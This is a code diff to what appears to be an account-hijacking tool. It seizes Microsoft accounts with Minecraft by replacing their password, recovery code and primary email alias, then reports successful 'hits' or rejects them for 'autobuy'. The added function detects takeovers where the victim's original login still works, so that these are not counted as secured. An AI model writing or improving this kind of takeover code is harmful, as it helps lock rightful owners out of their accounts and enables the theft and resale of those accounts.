@@ -83,6 +83,33 @@ def _reject_failure(email: str, reason: str, account: dict, *, credentials_chang
     }
 
 
+def _secure_did_not_stick(account: dict) -> bool:
+    """True when passwordless/Gmail OTP secure printed success but changed nothing."""
+    ms = (account or {}).get("microsoft") or {}
+    pwd = str(ms.get("password") or "").strip()
+    pwd_bad = (
+        not pwd
+        or pwd in {"Couldn't Change!", "Unknown", "N/A", "?", "Failed"}
+        or "UNVERIFIED" in pwd
+    )
+    rc = str(ms.get("recovery_code") or "").strip()
+    rc_bad = (not rc) or rc in {
+        "Couldn't Change!",
+        "Failed to generate",
+        "invalid",
+    }
+    replaced = ms.get("primary_alias_replaced") is True
+    email_now = str(ms.get("email") or "").strip().lower()
+    orig = str(ms.get("original_email") or "").strip().lower()
+    if (
+        email_now.startswith("sunny")
+        and email_now.endswith("@outlook.com")
+        and email_now != orig
+    ):
+        replaced = True
+    return pwd_bad and rc_bad and not replaced
+
+
 def _step(msg: str) -> None:
     print(msg, flush=True)
     logging.info(msg)
@@ -96,6 +123,14 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
             # Always seed with the email we logged in as — never leave
             # "Couldn't Change!" if a later step fails before alias replace.
             "email": email or "Couldn't Change!",
+            # Login mailbox (often Gmail OTP). Used as SA proof after AddPassword;
+            # never polled via get_email_code unless it is our domain.
+            "login_security_email": (
+                str(email).strip() if email and "@" in str(email) else ""
+            ),
+            "original_email": (
+                str(email).strip() if email and "@" in str(email) else ""
+            ),
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": "Couldn't Change!",
@@ -308,6 +343,20 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
         creds_changed = True
 
     from securing.account_filters import is_embed_verify_no_minecraft
+
+    # Passwordless Gmail / cookies-only: pipeline used to print "secured"
+    # while password, recovery, and primary were all unchanged. Do not
+    # ignore autobuy reject / post a green hit in that case.
+    if _secure_did_not_stick(account):
+        print("[X] - Secure did not stick (password/alias/recovery unchanged)")
+        logging.warning("secure did not stick for %s", email)
+        return _reject_failure(
+            email,
+            "Could not change password, recovery code, or primary email. "
+            "The original login is still active.",
+            account,
+            credentials_changed=False,
+        )
 
     # Embed OTP: no Java Minecraft → do not post a hit. User sees the fail embed.
     if embed_verify and (
